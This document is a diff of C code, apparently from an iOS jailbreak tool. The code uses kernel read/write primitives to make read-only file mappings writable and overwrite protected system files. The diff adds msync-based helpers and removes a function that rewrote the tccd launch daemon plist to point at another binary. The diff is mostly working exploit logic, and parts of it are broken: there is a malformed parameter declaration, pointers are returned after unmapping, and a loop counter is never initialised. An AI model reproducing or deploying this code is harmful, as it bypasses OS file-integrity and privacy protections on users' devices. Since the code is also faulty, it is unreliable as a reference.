@@ -18,6 +18,10 @@
 #define FLAGS_PROT_MASK    0x780
 #define FLAGS_MAXPROT_MASK 0x7800
 
+// https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.41.9/bsd/sys/mman.h#L143 from wh1te4ever/xsf1re
+#define MS_INVALIDATE   0x0002  /* [MF|SIO] invalidate all cached data https://openradar.appspot.com/FB8914231 My favorite: you can call msync(…, MS_INVALIDATE) on the mmaped region, asking xnu to throw away what it knows about the vnode. If you compile mmap_copy.cc with MMAP_COPY_MSYNC_INVALIDATE defined, it will do this. You can even use this technique to “save” a broken vnode from an entirely different process by opening the file,mmaping it, and then calling msync. */
+
+
 uint64_t getTask(void) {
     uint64_t proc = getProc(getpid());
     uint64_t proc_ro = kread64(proc + 0x18);
@@ -136,6 +140,50 @@ uint64_t task_get_vm_map(uint64_t task_ptr)
     return kread_ptr(task_ptr + 0x28);
 }
 
+char* funVnodeRead(*file) {
+    printf("attempting opa's method\n");
+    printf("reading %s", file);
+    int file_index = open(file, O_RDONLY);
+    if (file_index == -1)  {
+        printf("to file nonexistent\n)");
+        return -1;
+    }
+    off_t file_size = lseek(file_index, 0, SEEK_END);
+    printf("mmap as readonly\n");
+    char* file_data = mmap(NULL, file_size, PROT_READ, MAP_SHARED | MAP_RESILIENT_CODESIGN, file_index, 0);
+    if (file_data == MAP_FAILED) {
+        printf("Map failed\n");
+        close(file_index);
+        return 0;
+    }
+    munmap(file_data, file_size);
+    close(file_index);
+    return file_data;
+}
+
+void funVnodeSave(char* file) {
+    int file_index = open(file, O_RDONLY);
+    if (file_index == -1)  {
+        printf("to file nonexistent\n)");
+        return;
+    }
+    off_t file_size = lseek(file_index, 0, SEEK_END);
+    printf("mmap as readonly\n");
+    char* file_data = mmap(NULL, file_size, PROT_READ, MAP_SHARED, file_index, 0);
+    if (file_data == MAP_FAILED) {
+        close(file_index);
+        return;
+    }
+    
+    for (int i; i<10; i++) {
+        // msync with invalidate to
+        printf("msyncing\n");
+        if (msync(file_data, file_size, MS_INVALIDATE) == -1) {
+            perror("[-] Failed to msync\n");
+        }
+    }
+}
+
 #pragma mark overwrite2
 uint64_t funVnodeOverwrite2(char* to, char* from) {
     printf("attempting opa's method\n");
@@ -170,14 +218,14 @@ uint64_t funVnodeOverwrite2(char* to, char* from) {
         return 0;
     }
     
-    // set prot to re-
+    // set prot to rw-
     printf("task_get_vm_map -> vm ptr\n");
     uint64_t vm_ptr = task_get_vm_map(getTask());
     uint64_t entry_ptr = vm_map_find_entry(vm_ptr, (uint64_t)to_file_data);
     printf("set prot to rw-\n");
     vm_map_entry_set_prot(entry_ptr, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);
     
-    char* from_file_data = mmap(NULL, from_file_size, PROT_READ, MAP_PRIVATE, from_file_index, 0);
+    char* from_file_data = mmap(NULL, from_file_size, PROT_READ, MAP_SHARED, from_file_index, 0);
     if (from_file_data == MAP_FAILED) {
         perror("[-] Failed mmap (from_mapped)");
         close(from_file_index);
@@ -185,16 +233,18 @@ uint64_t funVnodeOverwrite2(char* to, char* from) {
         return -1;
     }
     
-    printf("it is writable!!\n");
+    printf("it is writable!\n");
     memcpy(to_file_data, from_file_data, from_file_size);
-
+    printf("[i] msync ret: %dn", msync(to_file_data, to_file_size, MS_SYNC));
+//    funVnodeSave(to);
+    
     // Cleanup
     munmap(from_file_data, from_file_size);
     munmap(to_file_data, to_file_size);
     
     close(from_file_index);
     close(to_file_index);
-
+    printf("done\n");
     // Return success or error code
     return 0;
 }
@@ -240,56 +290,4 @@ uint64_t funVnodeOverwriteWithBytes(const char* filename, off_t file_offset, con
     return 1;
 }
 
-uint64_t funVnodeOverwriteTccdPlist(char* path) {
-    const char* plistFilePath = "/System/Library/LaunchDaemons/com.apple.tccd.plist";
-    const char* oldString = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
-    const char* newString = path;
-    // Open the plist file for reading
-    printf("opening plist file\n");
-    FILE* file = fopen(plistFilePath, "r");
-    if (!file) {
-        fprintf(stderr, "Failed to open the property list file.\n");
-        return 1;
-    }
-    // Find the file size
-    fseek(file, 0, SEEK_END);
-    long fileSize = ftell(file);
-    fseek(file, 0, SEEK_SET);
-    // Allocate memory to store the content
-    char* content = (char*)malloc(fileSize + 1); // Add 1 for null terminator
-    if (!content) {
-        fprintf(stderr, "Memory allocation failed.\n");
-        fclose(file);
-        return 1;
-    }
-    // Read the content of the plist file
-    size_t bytesRead = fread(content, 1, fileSize, file);
-    fclose(file);
-    if (bytesRead != (size_t)fileSize) {
-        fprintf(stderr, "Error while reading the property list file.\n");
-        free(content);
-        return 1;
-    }
-    content[fileSize] = '\0'; // Null-terminate the content
-    // Find the position of the old string in the content
-    char* position = strstr(content, oldString);
-    if (!position) {
-        fprintf(stderr, "The old string was not found in the property list.\n");
-        free(content);
-        return 1;
-    }
-    // Calculate the offset of the old string within the file
-    off_t oldStringOffset = position - content;
-    // Write the new string into the plist file using the provided function
-    printf("overwriting tccd plist with bytes\n");
-    uint64_t result = funVnodeOverwriteWithBytes(plistFilePath, oldStringOffset, newString, strlen(newString), true);
-    if (result != 0) {
-        fprintf(stderr, "Failed to overwrite the old string with the new string.\n");
-        free(content);
-        return 1;
-    }
-    // Free dynamically allocated memory
-    free(content);
-    printf("Property list file successfully modified.\n");
-    return 0;
-}
+
